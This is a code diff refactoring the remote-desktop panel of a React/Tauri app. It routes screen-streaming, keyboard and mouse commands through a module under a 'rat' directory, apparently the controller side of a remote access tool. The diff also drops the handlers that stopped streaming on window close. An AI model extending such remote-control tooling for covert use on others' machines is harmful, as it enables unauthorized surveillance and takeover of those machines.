@@ -1,8 +1,14 @@
 import React, { useEffect, useRef, useState } from "react";
 import { listen } from "@tauri-apps/api/event";
-import { invoke } from "@tauri-apps/api/tauri";
 import { getCurrent, WebviewWindow } from "@tauri-apps/api/window";
 import { useParams } from "react-router-dom";
+import {
+  startRemoteDesktopCmd,
+  stopRemoteDesktopCmd,
+  fetchClientCmd,
+  sendKeyboardInputCmd,
+  sendMouseClickCmd,
+} from "../rat/RATCommands";
 
 import {
   IconHandClick,
@@ -54,7 +60,7 @@ export const RemoteDesktop: React.FC = () => {
 
     const grabDisplayData = async () => {
       try {
-        const clientInfo: any = await invoke("fetch_client", { addr });
+        const clientInfo: any = await fetchClientCmd(addr);
         if (clientInfo && clientInfo.displays) {
           const displayArray = Array.from(
             { length: clientInfo.displays },
@@ -68,23 +74,6 @@ export const RemoteDesktop: React.FC = () => {
     };
 
     grabDisplayData();
-
-    const setupCleanup = async () => {
-      try {
-        const window = getCurrent();
-
-        await window.listen("tauri://close-requested", async () => {
-          if (streaming) {
-            await stopStreamingAndCleanup();
-          }
-          window.close();
-        });
-      } catch (error) {
-        console.error("Error setting up window close handler:", error);
-      }
-    };
-
-    setupCleanup();
 
     return () => {
       if (streaming) {
@@ -135,15 +124,15 @@ export const RemoteDesktop: React.FC = () => {
       }
 
       // Send the keyboard input to the client
-      invoke("send_keyboard_input", {
+      sendKeyboardInputCmd(
         addr,
         keyCode,
         character,
-        isKeydown: true,
+        true,
         shiftPressed,
-        ctrlPressed: ctrlPressed && !isSpecialKey, // Only send ctrl for non-special keys unless actually pressed with Ctrl
-        capsLock,
-      }).catch((error) => {
+        ctrlPressed && !isSpecialKey, // Only send ctrl for non-special keys unless actually pressed with Ctrl
+        capsLock
+      ).catch((error) => {
         console.error("Error sending keyboard down event:", error);
       });
     };
@@ -179,15 +168,15 @@ export const RemoteDesktop: React.FC = () => {
         character = "";
       }
 
-      invoke("send_keyboard_input", {
+      sendKeyboardInputCmd(
         addr,
         keyCode,
         character,
-        isKeydown: false,
+        false,
         shiftPressed,
-        ctrlPressed: ctrlPressed && !isSpecialKey, // Only send ctrl for non-special keys unless actually pressed with Ctrl
-        capsLock,
-      }).catch((error) => {
+        ctrlPressed && !isSpecialKey,
+        capsLock
+      ).catch((error) => {
         console.error("Error sending keyboard up event:", error);
       });
     };
@@ -202,22 +191,6 @@ export const RemoteDesktop: React.FC = () => {
       document.removeEventListener("keyup", handleKeyUp);
     };
   }, [streaming, keyboardControlEnabled, addr]);
-
-  useEffect(() => {
-    let cleanupFn: (() => void) | undefined;
-
-    let window = getCurrent();
-
-    listen("close_window", () => {
-      window.close();
-    }).then((unlisten) => {
-      cleanupFn = unlisten;
-    });
-
-    return () => {
-      if (cleanupFn) cleanupFn();
-    };
-  }, []);
 
   useEffect(() => {
     const unlisten = listen("remote_desktop_frame", (event) => {
@@ -270,15 +243,15 @@ export const RemoteDesktop: React.FC = () => {
 
     try {
       // Send key up events for all modifier keys
-      await invoke("send_keyboard_input", {
+      sendKeyboardInputCmd(
         addr,
-        keyCode: 0, // Not using a specific key code
-        character: "",
-        isKeydown: false, // Key up event
-        shiftPressed: false,
-        ctrlPressed: false,
-        capsLock: false,
-      });
+        0, // Not using a specific key code
+        "",
+        false, // Key up event
+        false,
+        false,
+        false
+      );
 
       // Also reset our UI state
       setCapsLockState(false);
@@ -300,12 +273,7 @@ export const RemoteDesktop: React.FC = () => {
     if (!streaming) return;
 
     try {
-      // Reset keyboard state before stopping streaming
-      if (keyboardControlEnabled) {
-        await resetClientKeyboardState();
-      }
-
-      await invoke("stop_remote_desktop", { addr });
+      await stopRemoteDesktopCmd(addr);
       setStreaming(false);
       setConnectionStatus("Disconnected");
     } catch (error) {
@@ -316,12 +284,7 @@ export const RemoteDesktop: React.FC = () => {
   const handleStartStreaming = async () => {
     setConnectionStatus("Connecting...");
     try {
-      await invoke("start_remote_desktop", {
-        addr,
-        display: selectedDisplay,
-        quality,
-        fps,
-      });
+      await startRemoteDesktopCmd(addr, selectedDisplay, quality, fps);
       setStreaming(true);
       setConnectionStatus("Connected");
     } catch (error) {
@@ -335,34 +298,13 @@ export const RemoteDesktop: React.FC = () => {
     setConnectionStatus("Ready to connect");
   };
 
-  useEffect(() => {
-    const handleBeforeUnload = () => {
-      if (streaming) {
-        invoke("stop_remote_desktop", { addr }).catch((err) =>
-          console.error("Error stopping remote desktop on close:", err)
-        );
-      }
-    };
-
-    window.addEventListener("beforeunload", handleBeforeUnload);
-
-    return () => {
-      window.removeEventListener("beforeunload", handleBeforeUnload);
-    };
-  }, [addr, streaming]);
-
   const switchDisplay = async (newDisplay: number) => {
     if (streaming) {
-      await invoke("stop_remote_desktop", { addr });
+      await stopRemoteDesktopCmd(addr);
 
       setSelectedDisplay(newDisplay);
 
-      await invoke("start_remote_desktop", {
-        addr,
-        display: newDisplay,
-        quality,
-        fps,
-      });
+      await startRemoteDesktopCmd(addr, newDisplay, quality, fps);
     } else {
       setSelectedDisplay(newDisplay);
     }
@@ -408,15 +350,15 @@ export const RemoteDesktop: React.FC = () => {
     );
 
     try {
-      await invoke("send_mouse_click", {
+      await sendMouseClickCmd(
         addr,
-        display: selectedDisplay,
-        x: targetX,
-        y: targetY,
-        clickType: event.button,
-        actionType: 1, // Mouse down
-        scrollAmount: 0,
-      });
+        selectedDisplay,
+        targetX,
+        targetY,
+        event.button,
+        1,
+        0
+      );
     } catch (error) {
       console.error("Error sending mouse down event:", error);
     }
@@ -451,15 +393,15 @@ export const RemoteDesktop: React.FC = () => {
     );
 
     try {
-      await invoke("send_mouse_click", {
+      await sendMouseClickCmd(
         addr,
-        display: selectedDisplay,
-        x: targetX,
-        y: targetY,
-        clickType: event.button,
-        actionType: 2, // Mouse up
-        scrollAmount: 0,
-      });
+        selectedDisplay,
+        targetX,
+        targetY,
+        event.button,
+        2, // Mouse up
+        0
+      );
     } catch (error) {
       console.error("Error sending mouse up event:", error);
     }
@@ -487,15 +429,15 @@ export const RemoteDesktop: React.FC = () => {
 
     try {
       // Just update the cursor position without changing button state
-      await invoke("send_mouse_click", {
+      await sendMouseClickCmd(
         addr,
-        display: selectedDisplay,
-        x: targetX,
-        y: targetY,
-        clickType: activeMouseButton || 0,
-        actionType: 3, // Mouse move during drag (custom action type)
-        scrollAmount: 0,
-      });
+        selectedDisplay,
+        targetX,
+        targetY,
+        activeMouseButton || 0,
+        3, // Mouse move during drag (custom action type)
+        0
+      );
     } catch (error) {
       console.error("Error sending mouse move event:", error);
     }
@@ -524,15 +466,15 @@ export const RemoteDesktop: React.FC = () => {
     const isScrollUp = event.deltaY < 0;
 
     try {
-      await invoke("send_mouse_click", {
+      await sendMouseClickCmd(
         addr,
-        display: selectedDisplay,
-        x: targetX,
-        y: targetY,
-        clickType: 3, // Scroll action
-        actionType: isScrollUp ? 4 : 5, // 4 for up, 5 for down
-        scrollAmount: scrollAmount,
-      });
+        selectedDisplay,
+        targetX,
+        targetY,
+        3, // Scroll action
+        isScrollUp ? 4 : 5, // 4 for up, 5 for down
+        scrollAmount
+      );
     } catch (error) {
       console.error("Error sending scroll event:", error);
     }
@@ -560,15 +502,15 @@ export const RemoteDesktop: React.FC = () => {
     );
 
     try {
-      await invoke("send_mouse_click", {
+      await sendMouseClickCmd(
         addr,
-        display: selectedDisplay,
-        x: targetX,
-        y: targetY,
-        clickType: event.button,
-        actionType: 0, // Complete click (down+up)
-        scrollAmount: 0,
-      });
+        selectedDisplay,
+        targetX,
+        targetY,
+        event.button,
+        0, // Complete click (down+up)
+        0
+      );
     } catch (error) {
       console.error("Error sending mouse click:", error);
     }
